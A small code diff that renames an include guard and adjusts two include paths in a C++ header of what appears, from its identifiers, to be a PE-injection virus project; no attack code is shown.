@@ -1,10 +1,10 @@
 #pragma once
 
-#ifndef PEINJECTIONVIRUS_INCLUDE_VIRUS_VIRUS_H_
-#define PEINJECTIONVIRUS_INCLUDE_VIRUS_VIRUS_H_
+#ifndef PEINJECTIONVIRUS_INCLUDE_VIRUS_VIRUSCPP_H_
+#define PEINJECTIONVIRUS_INCLUDE_VIRUS_VIRUSCPP_H_
 
-#include "pecpp.h"
-#include "virus.h"
+#include "pe/pecpp.h"
+#include "virus/virus.h"
 
 namespace virus
 {
